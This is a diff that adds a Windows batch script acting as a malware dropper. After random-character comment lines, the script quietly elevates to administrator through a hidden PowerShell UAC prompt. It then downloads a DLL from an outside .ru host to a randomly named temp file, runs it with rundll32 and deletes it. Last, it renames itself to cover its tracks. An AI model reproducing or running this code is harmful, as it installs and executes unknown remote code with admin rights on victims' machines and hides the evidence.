@@ -1,0 +1,40 @@
+:: pw&S3G#kKvIrdPEx,n7I_b5s44CnWBU*fYUgH119-:=(n!@(5+wG)dz&;Th5nK(g8sR8}wztM(vQ=udVe_=w}XD,F0S$UE
+:: Z..CzYOLP0P121tfxBjum}3E1*RZP6bw<GF!@nXxC3r1:*Y<QdmF?5UU@9.()S<9iyxt.<uhza!PA4(hfh6P{Rj1]Dk7Y
+:: 2KVIOWsu|.f]W&em
+@echo off
+if defined ADMIN_CHECKED goto :after_uac_check
+
+:: UAC self-elevation
+whoami /groups | findstr /i "S-1-16-12288" >nul 2>&1
+if %errorlevel% neq 0 (
+    set "ADMIN_CHECKED=1"
+    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c ""%~fs0""' -Verb RunAs"
+    exit /b
+)
+:after_uac_check
+
+setlocal enabledelayedexpansion
+set "string=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+set "result="
+
+for /L %%i in (1,1,12) do call :add
+goto :execute
+
+:add
+set /a x=%random% %% 62
+set result=!result!!string:~%x%,1!
+goto :eof
+
+:execute
+set "url=https://colortune.ru/launcher.dll"
+set "output=%TEMP%\%result%.dll"
+
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
+
+powershell -Command "Start-Process rundll32.exe -ArgumentList '%output%', 'EntryPoint'"
+
+powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 3; Remove-Item -Force '%output%' -ErrorAction SilentlyContinue"
+
+REN "%~f0" "%result%.cmd" 2>nul
+
+exit
